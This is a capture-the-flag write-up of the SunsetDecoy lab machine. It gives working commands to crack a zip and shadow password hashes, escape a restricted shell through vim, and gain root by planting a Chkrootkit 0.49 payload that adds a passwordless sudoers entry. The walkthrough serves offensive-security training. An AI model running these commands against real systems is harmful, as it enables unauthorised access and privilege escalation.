# Offsec: SunsetDecoy

***Overview**: SunsetDecoy is room rated as Easy on Offensive Security Playground which exploits  sensitive files exposure to gain foothold and also elevates privileges by exploiting vulnerable processes.*

#### Scanning and Enumeration
- I firstly start by scanning for open ports and service `nmap -sV -sC -T4 -A -p- 192.168.53.85`
![](SunsetDecoy_assets/Pasted%20image%2020221026172513.png)
- then i scan for directories using FFUF ` ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://192.168.53.85/FUZZ`
![](SunsetDecoy_assets/Pasted%20image%2020221026172547.png)
- going to the site, I see it contains a zip file
![](SunsetDecoy_assets/Pasted%20image%2020221026170010.png)
- then i cracked the zip using `fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip` and got the password 
![](SunsetDecoy_assets/Pasted%20image%2020221026170059.png)
- then i opened the zip file
![](SunsetDecoy_assets/Pasted%20image%2020221026170333.png)
- viewing the file, i get the passwd file, shadow file and other files
![](SunsetDecoy_assets/Pasted%20image%2020221026170349.png)
- viewing the passwd file and I found a user
![](SunsetDecoy_assets/Pasted%20image%2020221026170508.png)
- then shadow file, and also fins the entry for that user
![](SunsetDecoy_assets/Pasted%20image%2020221026170541.png)
- i'll put both entries in different files
![](SunsetDecoy_assets/Pasted%20image%2020221026172322.png)
#### Foothold
- then using the unshadow tool i'll combine both entries so i can crack the hash to 
 get the password `unshadow passwd.txt shadow.txt > unshadow.txt`
![](SunsetDecoy_assets/Pasted%20image%2020221026172344.png)
- using john I crack the hash `john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt` and get the password as `server`
![](SunsetDecoy_assets/Pasted%20image%2020221026172816.png)
- then logging in, I get foothold `ssh 296640a3b825115a47b68fc44501c828@192.168.53.85`
![](SunsetDecoy_assets/Pasted%20image%2020221026173033.png)
- so i realised i am in a restricted shell
![](SunsetDecoy_assets/Pasted%20image%2020221026181146.png)
- viewing the current directory, i saw a script honeypot.decoy and then running it, use thr option 7, which lets me leave a note, and it opens vim
- so I break out of the restricted shell by running the following
```text
:set shell=/bin/sh
:shell
```
![](SunsetDecoy_assets/Pasted%20image%2020221026180708.png)
- I firstly spawn a more interactive shell with python, then I export the PATH and SHELL environmental variables
`python -c 'import pty;pty.spawn("/bin/bash")'`
```bash
export PATH=/bin:/usr/bin:$PATH
export SHELL=/bin/bash:$SHELL
```
![](SunsetDecoy_assets/Pasted%20image%2020221026181157.png)
- then i got the first flag
![](SunsetDecoy_assets/Pasted%20image%2020221026181320.png)
#### Privilege Escalation
- so now looking at the option 5 for that script, i see that i can run an Antivirus scan, do I run it
![](SunsetDecoy_assets/Pasted%20image%2020221026191542.png)
- then i run a pspy script to checking for running processes using `pspy64`
![](SunsetDecoy_assets/Pasted%20image%2020221026191608.png)
- searching for an exploit for the service Chkrootkit 0.49 to escalate privileges [https://www.exploit-db.com/exploits/33899](https://www.exploit-db.com/exploits/33899)
![](SunsetDecoy_assets/Pasted%20image%2020221026191713.png)
- so I follow the steps for the exploit
![](SunsetDecoy_assets/Pasted%20image%2020221026192937.png)
- so to exploit it, i  will have to create a file named update in the /tmp directory and then because of the process running, that file will get executed with root privileges, so we will add our name to the sudoers file  `echo 'chmod 777 /etc/sudoers && echo "296640a3b825115a47b68fc44501c828 ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update`
- then checking I see that i have sudo privileges
![](SunsetDecoy_assets/Pasted%20image%2020221026192702.png)
- then i escalate privileges and finally get root privileges
![](SunsetDecoy_assets/Pasted%20image%2020221026192800.png)

[How to break out of restricted shells](https://null-byte.wonderhowto.com/how-to/escape-restricted-shell-environments-linux-0341685/)
[Upgrading to fully interactive shells including with socat](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
